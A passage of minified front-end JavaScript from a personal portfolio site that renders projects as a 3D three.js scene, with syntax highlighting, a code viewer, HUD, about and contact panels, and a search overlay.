]*)@\w+(?:\.\w+)*/m,lookbehind:!0,alias:["annotation","punctuation"],inside:{punctuation:/\./}},keyword:/\b(?:_(?=\s*:)|and|as|assert|async|await|break|case|class|continue|def|del|elif|else|except|exec|finally|for|from|global|if|import|in|is|lambda|match|nonlocal|not|or|pass|print|raise|return|try|while|with|yield)\b/,builtin:/\b(?:__import__|abs|all|any|apply|ascii|basestring|bin|bool|buffer|bytearray|bytes|callable|chr|classmethod|cmp|coerce|compile|complex|delattr|dict|dir|divmod|enumerate|eval|execfile|file|filter|float|format|frozenset|getattr|globals|hasattr|hash|help|hex|id|input|int|intern|isinstance|issubclass|iter|len|list|locals|long|map|max|memoryview|min|next|object|oct|open|ord|pow|property|range|raw_input|reduce|reload|repr|reversed|round|set|setattr|slice|sorted|staticmethod|str|sum|super|tuple|type|unichr|unicode|vars|xrange|zip)\b/,boolean:/\b(?:False|None|True)\b/,number:/\b0(?:b(?:_?[01])+|o(?:_?[0-7])+|x(?:_?[a-f0-9])+)\b|(?:\b\d+(?:_\d+)*(?:\.(?:\d+(?:_\d+)*)?)?|\B\.\d+(?:_\d+)*)(?:e[+-]?\d+(?:_\d+)*)?j?(?!\w)/i,operator:/[-+%=]=?|!=|:=|\*\*?=?|\/\/?=?|<[<=>]?|>[=>]?|[&|^~]/,punctuation:/[{}[\];(),.:]/};Prism.languages.python["string-interpolation"].inside.interpolation.inside.rest=Prism.languages.python;Prism.languages.py=Prism.languages.python;(function(i){i.languages.typescript=i.languages.extend("javascript",{"class-name":{pattern:/(\b(?:class|extends|implements|instanceof|interface|new|type)\s+)(?!keyof\b)(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*(?:\s*<(?:[^<>]|<(?:[^<>]|<[^<>]*>)*>)*>)?/,lookbehind:!0,greedy:!0,inside:null},builtin:/\b(?:Array|Function|Promise|any|boolean|console|never|number|string|symbol|unknown)\b/}),i.languages.typescript.keyword.push(/\b(?:abstract|declare|is|keyof|readonly|require)\b/,/\b(?:asserts|infer|interface|module|namespace|type)\b(?=\s*(?:[{_$a-zA-Z\xA0-\uFFFF]|$))/,/\btype\b(?=\s*(?:[\{*]|$))/),delete i.languages.typescript.parameter,delete i.languages.typescript["literal-property"];var t=i.languages.extend("typescript",{});delete t["class-name"],i.languages.typescript["class-name"].inside=t,i.languages.insertBefore("typescript","function",{decorator:{pattern:/@[$\w\xA0-\uFFFF]+/,inside:{at:{pattern:/^@/,alias:"operator"},function:/^[\s\S]+/}},"generic-function":{pattern:/#?(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*\s*<(?:[^<>]|<(?:[^<>]|<[^<>]*>)*>)*>(?=\s*\()/,greedy:!0,inside:{function:/^#?(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*/,generic:{pattern:/<[\s\S]+/,alias:"class-name",inside:t}}}}),i.languages.ts=i.languages.typescript})(Prism);const Xh={cpp:"cpp",c:"c",csharp:"csharp",python:"python",typescript:"typescript",php:"php"};function qh(i){const t=document.createElement("div");t.className="codepanel",i.appendChild(t);const e={openPinId:null,activeTabIdx:0,tabs:[]},n=()=>{const r=e.tabs[e.activeTabIdx];if(!r){t.innerHTML="";return}const s=bn.find(p=>p.id===r.projectId),o=Uh(r.file)??"// snippet not yet vendored",a=Xh[r.lang]??"plain",l=qr.languages[a]??qr.languages.markup,h=qr.highlight(o,l,a).split(`
`).map((p,m)=>`<span class="ln">${m+1}</span>${p}`).join(`
`);t.innerHTML=`
      <div class="tabs">
        ${e.tabs.map((p,m)=>`<span class="tab ${m===e.activeTabIdx?"active":""}" data-idx="${m}">${di(p.file)}</span>`).join("")}
      </div>
      <div class="head">
        <span>// ${di(s?.name??"")} › ${di(r.file)}</span>
        <span>L ${r.lineStart} — ${r.lineEnd}</span>
      </div>
      <pre><code>${h}</code></pre>
      <div class="footer">
        <span>${di(r.caption)}</span>
        <span>${s?.githubUrl?`<a href="${s.githubUrl}" target="_blank" rel="noopener">${di(s.githubUrl.replace(/^https?:\/\//,""))} ↗</a>`:""}</span>
      </div>
    `,t.querySelectorAll(".tab").forEach(p=>{p.addEventListener("click",()=>{const m=Number(p.dataset.idx);e.activeTabIdx=m,n()})})};return{open(r){const s=sr.filter(o=>o.projectId===r.projectId);e.tabs=s,e.activeTabIdx=Math.max(0,s.findIndex(o=>o.id===r.id)),e.openPinId=r.id,t.classList.add("open"),n()},close(){e.openPinId=null,t.classList.remove("open")},isOpen:()=>e.openPinId!==null}}function di(i){return i.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;")}function Yh(i,t,e,n){const r=new Set;bn.forEach(m=>m.lang.forEach(E=>r.add(E)));const s=Array.from(r).map(m=>m.toUpperCase()).join(" · "),o=(e.length*2/t.nodes.length).toFixed(2),a=document.createElement("div");a.className="hud tl",a.innerHTML=`
    <div class="name">ERIC&nbsp;MEIGGS</div>
    <div class="handle">// 0xE666 &nbsp;·&nbsp; full-stack engineer</div>
    <div class="instrument">
      <div class="row"><span class="key">PROJECTS</span><span>${bn.length} KNOTS</span></div>
      <div class="row"><span class="key">NODES</span><span>${t.nodes.length}</span></div>
      <div class="row"><span class="key">EDGES</span><span>${e.length}</span></div>
      <div class="row"><span class="key">PINPOINTS</span><span>${sr.length}</span></div>
      <div class="row"><span class="key">AVG&nbsp;DEG</span><span>${o}</span></div>
      <div class="row"><span class="key">LANG</span><span>${s}</span></div>
      <div class="row"><span class="key">STATUS</span><span>● ONLINE</span></div>
    </div>
  `,i.appendChild(a);const l=document.createElement("div");l.className="hud tr";const u=[...bn].filter(m=>m.tier<=4).sort((m,E)=>m.tier-E.tier||E.nodeCount-m.nodeCount).slice(0,8).map(m=>{const E=Math.round(m.nodeCount/140*10),x="▰".repeat(E),f="▱".repeat(10-E);return`<div>${m.name.padEnd(22," ")} ${x}${f} ${String(m.nodeCount).padStart(3," ")}</div>`}).join(`
`);l.innerHTML=`
    <nav>
      <b id="nav-works">WORKS</b> &nbsp;
      <span id="nav-about">ABOUT</span> &nbsp;
      <span id="nav-contact">CONTACT</span>
    </nav>
    <div class="sort">SORT <u>COMPLEXITY ▾</u></div>
    <div class="stats">
      <div style="opacity:0.55; letter-spacing:0.18em; margin-bottom:4px;">// CLUSTERS</div>
      <pre style="margin:0; font-family:inherit; font-size:8.5px; line-height:1.55;">${u}</pre>
    </div>
  `,i.appendChild(l);const h=document.createElement("div");h.className="hud bl",h.innerHTML="[DRAG] rotate &nbsp;·&nbsp; [SCROLL] zoom &nbsp;·&nbsp; [HOVER PIN] inspect &nbsp;·&nbsp; [/] search &nbsp;·&nbsp; [ESC] close",i.appendChild(h);const p=document.createElement("div");p.className="hud br",p.innerHTML=`
    v0.1.0 &nbsp;·&nbsp; build production · three.js
    <br />
    <span style="opacity:0.4">meiggs.dev &nbsp;·&nbsp; github.com/0xE666</span>
  `,i.appendChild(p),document.getElementById("nav-about")?.addEventListener("click",n.openAbout),document.getElementById("nav-contact")?.addEventListener("click",n.openContact)}function jh(i){const t=document.createElement("div");t.className="slidepanel about",t.innerHTML=`
    <span class="close" data-close>×</span>
    <h3>// ABOUT</h3>
    <p>Full-stack engineer. I build at the seams &mdash; APIs that shouldn't exist (iOS reverse-engineering for Soundmap-API), agents that route across local + cloud LLMs (vaal), and Windows internals tooling for security research.</p>
    <p>Comfortable from PHP at the surface to PE/IAT walks in C++ at the bottom. Most of my public work is on GitHub as <a href="https://github.com/0xE666" target="_blank" rel="noopener">0xE666</a>.</p>
    <p style="opacity:0.55; font-size:11px; margin-top:32px;">
      Tier-1 work shown on the bridge: <strong>vaal</strong>, <strong>Windows-Internals research</strong>.
      Tier-2: <strong>Soundmap-API</strong>, <strong>poe_null</strong>, <strong>poe-trade-api</strong>, <strong>poe-watcher</strong>.
    </p>
  `,i.appendChild(t),t.querySelector("[data-close]")?.addEventListener("click",()=>t.classList.remove("open"));let e=!1;return{open(){e=!0,t.classList.add("open")},close(){e=!1,t.classList.remove("open")},isOpen:()=>e}}function $h(i){const t=document.createElement("div");t.className="slidepanel contact",t.innerHTML=`
    <span class="close" data-close>×</span>
    <h3>// CONTACT</h3>
    <ul style="list-style:none; padding:0; margin:0; line-height:2;">
      <li>email &nbsp;&nbsp;&nbsp;<a href="mailto:ericflipreset@gmail.com">ericflipreset@gmail.com</a></li>
      <li>discord &nbsp;<span style="color:var(--fg);">eric.cpp</span></li>
    </ul>
    <p style="opacity:0.45; font-size:11px; margin-top:24px;">
      Open to: full-stack roles, security-research, AI agent / tooling work, contract.
    </p>
  `,i.appendChild(t),t.querySelector("[data-close]")?.addEventListener("click",()=>t.classList.remove("open"));let e=!1;return{open(){e=!0,t.classList.add("open")},close(){e=!1,t.classList.remove("open")},isOpen:()=>e}}function Kh(i,t){const e=document.createElement("div");e.className="search-overlay",e.innerHTML=`
    <input type="text" placeholder="search projects, pins, files…" />
    <div class="results"></div>
  `,i.appendChild(e);const n=e.querySelector("input"),r=e.querySelector(".results");let s=0,o=[],a=!1;const l=[...bn.map(p=>({type:"project",id:p.id,label:`${p.name}  //  T${p.tier}  ${p.lang.join(" ")}`})),...sr.map(p=>({type:"pin",id:p.id,label:`${p.file}:${p.lineStart}  //  ${p.label}`,pin:p}))],c=()=>{if(!o.length){r.innerHTML='<div class="result" style="opacity:0.4">no matches</div>';return}r.innerHTML=o.map((p,m)=>`<div class="result ${m===s?"active":""}" data-idx="${m}">${Zh(p.label)}</div>`).join(""),r.querySelectorAll(".result").forEach(p=>{p.addEventListener("click",()=>{s=Number(p.dataset.idx),u()})})},u=()=>{const p=o[s];p&&(p.type==="pin"&&p.pin&&t.open(p.pin),h.close())};n.addEventListener("input",()=>{const p=n.value.trim().toLowerCase();o=p?l.filter(m=>m.label.toLowerCase().includes(p)):l.slice(0,30),s=0,c()}),n.addEventListener("keydown",p=>{p.key==="ArrowDown"?(s=Math.min(o.length-1,s+1),c(),p.preventDefault()):p.key==="ArrowUp"?(s=Math.max(0,s-1),c(),p.preventDefault()):p.key==="Enter"?u():p.key==="Escape"&&h.close()});const h={toggle(){a?h.close():(a=!0,e.classList.add("open"),n.value="",o=l.slice(0,30),s=0,c(),n.focus())},close(){a=!1,e.classList.remove("open")},isOpen:()=>a};return h}function Zh(i){return i.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}const Qa=2654435761;function Jh(){if((navigator.deviceMemory??8)<4)return!0;try{const t=document.createElement("canvas"),e=t.getContext("webgl2")||t.getContext("webgl");if(!e)return!1;if(e.getParameter(e.MAX_VERTEX_UNIFORM_VECTORS)<256)return!0}catch{}return!1}function Qh(){try{const i=document.createElement("canvas");return!!(i.getContext("webgl2")||i.getContext("webgl"))}catch{return!1}}function tm(){document.getElementById("bridge-canvas")?.remove(),document.getElementById("hud-root")?.remove();const i=document.getElementById("fallback");i.style.display="block";const t=document.getElementById("fallback-table");t.innerHTML=`
    <thead><tr><th>Tier</th><th>Project</th><th>Lang</th><th>Description</th></tr></thead>
    <tbody>${bn.map(e=>`
      <tr>
        <td>T${e.tier}</td>
        <td>${e.githubUrl?`<a href="${e.githubUrl}">${e.name}</a>`:e.name}</td>
        <td>${e.lang.join(", ")}</td>
        <td>${e.blurb}</td>
      </tr>`).join("")}
    </tbody>
  `}function em(){const i=document.getElementById("bridge-canvas");if(!i)throw new Error("canvas missing");const t=new Io({canvas:i,antialias:!0,alpha:!1});t.setPixelRatio(Math.min(2,window.devicePixelRatio)),t.setClearColor(0,1);const e=new Kf,n=Qf();n.attach(i);const r=()=>{const T=window.innerWidth,D=window.innerHeight;t.setSize(T,D,!1),n.camera.aspect=T/D,n.camera.updateProjectionMatrix()};window.addEventListener("resize",r),r();const s=Jh(),o=rh(bn,Qa,s?.5:1);window.__BRIDGE__=o;const a=lh(o.knots);e.add(a.group);const l=uh(o,Qa),c=ph(o,l);e.add(c.group);const u=zh(o);e.add(u.pinHalos,u.pinRings,u.pinDots),window.__PINS__=u;const h=document.getElementById("codepanel-root"),p=qh(h),m=document.getElementById("overlay-root"),E=jh(m),x=$h(m),f=Kh(m,p),d=document.getElementById("hud-root");Yh(d,o,l,{openAbout:()=>E.open(),openContact:()=>x.open()});const g=document.createElement("div");g.className="pin-tooltip",document.body.appendChild(g);let _=null;Hh(i,n.camera,u,T=>{if(_=T.index,T.pin){i.style.cursor="pointer",g.textContent=`${T.pin.label}  ·  ${T.pin.file}:${T.pin.lineStart}`,g.classList.add("visible");const D=Math.min(window.innerWidth-240,T.clientX+14),y=Math.max(8,T.clientY-28);g.style.left=`${D}px`,g.style.top=`${y}px`}else i.style.cursor="",g.classList.remove("visible")}),i.addEventListener("click",T=>{const D=i.getBoundingClientRect(),y=new zt((T.clientX-D.left)/D.width*2-1,-((T.clientY-D.top)/D.height)*2+1),R=new Lo;R.setFromCamera(y,n.camera);const k=R.intersectObject(u.pinDots,!1);if(k.length){const X=k[0].instanceId,et=u.pinAnchors[X];et&&(p.open(et),g.classList.remove("visible"))}else p.isOpen()&&p.close()}),window.addEventListener("keydown",T=>{T.key==="/"&&!(T.target instanceof HTMLInputElement)&&(T.preventDefault(),f.toggle()),T.key==="Escape"&&(f.isOpen()?f.close():p.isOpen()?p.close():E.isOpen()?E.close():x.isOpen()&&x.close())});let v=performance.now();const w=v;function S(){const T=performance.now(),D=(T-v)/1e3;v=T;const y=(T-w)/1e3;n.update(D),ch(a.spins,D),Gh(u,y,_),t.render(e,n.camera),requestAnimationFrame(S)}S(),console.log(`bridge: ${o.knots.length} knots, ${o.nodes.length} nodes, ${l.length} edges, ${u.pinAnchors.length} pins`)}Qh()?em():tm();
